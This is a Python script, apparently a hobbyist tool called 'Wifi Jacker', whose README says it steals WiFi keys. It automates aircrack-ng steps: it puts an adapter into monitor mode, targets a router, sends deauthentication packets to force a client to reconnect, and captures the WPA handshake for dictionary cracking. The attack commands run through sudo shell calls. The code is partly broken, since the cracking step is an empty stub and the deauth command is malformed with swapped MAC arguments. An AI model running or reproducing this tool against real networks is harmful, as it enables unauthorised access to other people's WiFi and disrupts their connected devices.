import os, sys, re, datetime

'''
   README:

        this is a quick program that (potentially) steals WiFi keys via brute force
        hats off to the guys who made aircrack-ng
        the success of this all depends on the strength of your password dictionary
        good WPA keys will be harder to crack


                ****    INGREDIENTS:    ****
                + Kali Linux/Backtrack
                + a USB wifi adapter capable of entering monitor mode
                + a meaty password list (under this directory)
                + consent

                ****    TO GET WIFI KEYS:   ****

                 STEP 0: put your wifi adapter into monitor mode.
                 STEP 1: find a router MAC, then hone in with said MAC
                 STEP 2: find a client connected to the target router
                 STEP 3: force client to re-connect and leak the 4-way handshake
                 STEP 4: pray to your deity of choice that step 3 works.
                 STEP 5: crack password found in step 3 using your password list
                           Again, no guarantee that this works.
                           Such is life/a reasonably strong WPA key.

        This is probably full of bugs that I will never fix

    TROUBLESHOOTING:

        this program assumes your USB wireless and minotor interfaces
        are named "wlan0" and "wlan0mon" respectively. change these accordingly.
'''


print(
    "       __      _              _         _                  __   _\n" +
    "       \ \    / (_) __(_)  _ | |__ _ __| |_____ _ _  __ __/  \ / |\n" +
    "        \ \/\/ /| | _|| | | || / _` / _| / / -_) '_| \ V / () || |\n" +
    "         \_/\_/ |_|_| |_|  \__/\__,_\__|_\_\___|_|    \_/ \__(_)_|\n\n\n")

class Wifi_Jacker:

    def __init__(self):
        self.mon_mode = False
        self.usb_int = "wlan0"
        self.mon_int = "wlan0mon"
        self.ap_MAC = None
        self.welcome()


    def welcome(self):
        picd = True
        while picd:
            resp = input("*** please select an option ***\n\n" \
                         "1. put interface into monitor mode\n" \
                         "2. scan for router MACs\n" \
                         "3. hone in on a router/scan for clients\n" \
                         "4. force client deauth\n" \
                         "5. crack password\n"
                         "6. exit\n\n")
            try:
                resp = int(resp)
            except ValueError:
                pass
            if resp not in range(1,8):
                pass
            else:
                picd = False
        if resp == 1:
            if not self.mon_mode:
                self.monmode_config(1)
            else:
                print("\ninterface already in monitor mode\n")
                self.welcome()
        elif resp == 2:
            if self.mon_mode:
                self.r_scan()
            else:
                print("\ninterface must be in monitor mode to scan\n")
                self.welcome()
        elif resp == 3:
            self.check_bssid()
        elif resp == 4:
            self.c_reconnect()
        elif resp == 5:
            self.crack()
        elif resp == 6:
            if self.mon_mode:
                self.monmode_config(-1)
            os.system("sudo pkill airodump-ng && sudo pkill python3")  #this is stupid but it works
            print("BYE")
            sys.exit(0)

    def monmode_config(self, conf):
        try:
            if conf == 1:
                print("\nputting interface " + self.usb_int +" into monitor mode...")
                mon_up = os.system("sudo airmon-ng start " + self.usb_int)
                if mon_up == 0:
                    self.mon_mode = True
                else:
                    raise OSError
                print("interface now in monitor mode...\n")
                self.welcome()
            elif conf == -1:
                print("\nputting interface " + self.usb_int + " back into managed mode...")
                mon_down = os.system("sudo airmon-ng stop " + self.mon_int)
                if mon_down == 0:
                    self.mon_mode = False
                else:
                    raise OSError
        except OSError:
            print("something went wrong here. check your interface(s)")
            pass

    def r_scan(self):
        try:
            pid = os.fork()
            if pid > 0:
                os.system("sudo xterm -e airodump-ng " + self.mon_int)
            self.welcome()
        except OSError:
            pass

    def check_bssid(self):
        picd = True
        while picd:
            bssid = input("please give the BSSID of the target AP (use '-' delimiter):")
            if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", bssid.lower()):
                picd = False
                chan = self.check_chan(True)
                self.hone(bssid, chan)
            else:
                print("invalid MAC")
                pass

    def c_reconnect(self):
        picd = True
        while picd:
            bssid = input("please give the MAC of a client connected to target AP (use '-' delimiter):")
            if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", bssid.lower()):
                picd = False
                bssid = bssid.replace(":", "-")
                deez = self.check_chan(False)
                try:
                    pid = os.fork()
                    if pid > 0:
                        os.system("sudo xterm -e aireplay-ng -0" + str(deez) + "-a "
                                  + str(bssid)
                                  + "-c " + str(self.ap_MAC) + " " + self.mon_int)
                except OSError:
                    print("something went wrong here.")
                    pass
                print("*** IMPORTANT ***\n" \
                      "You now need to wait until you see 'WPA: <AP MAC>\n' "
                      "in the top right had corner of your honed-in airodump-ng screen,\n"
                      "this signifies that the 4-way handshake has been caught\n."
                      "If this doesn't happen within a reasonable timeframe, you:\n "
                      "1. Are shit out of luck,\n"
                      "     as the client has not re-connected for some reason.\n"
                      "     Try again with a different client.\n"
                      "2. Need to physically move closer to the target AP/client.")
                self.welcome()
            else:
                print("invalid client MAC")
                pass

    def check_chan(self, opt):
        picd = True
        while picd:
            if opt:
                chan = input("please specify channel #:")
            else:
                chan = input("please specify # of deauth packets to send (2 is good):")
            try:
                resp = int(chan)
                picd = False
                return resp
            except ValueError:
                pass

    def hone(self, bssid, chan):
        try:
            pid = os.fork()
            if pid > 0:
                bssid = bssid.replace(":", "-")
                self.ap_MAC = bssid
                os.system("sudo xterm -e airodump-ng -c "
                          + str(chan) +
                          " --bssid " + str(bssid) +
                          " -w ./ " + self.mon_int)
            self.welcome()
        except OSError:
            print("something went wrong here. check your interface(s)")
            pass

    def crack(self):
        pass
        self.welcome()

if __name__ == "__main__":
    wj = Wifi_Jacker()
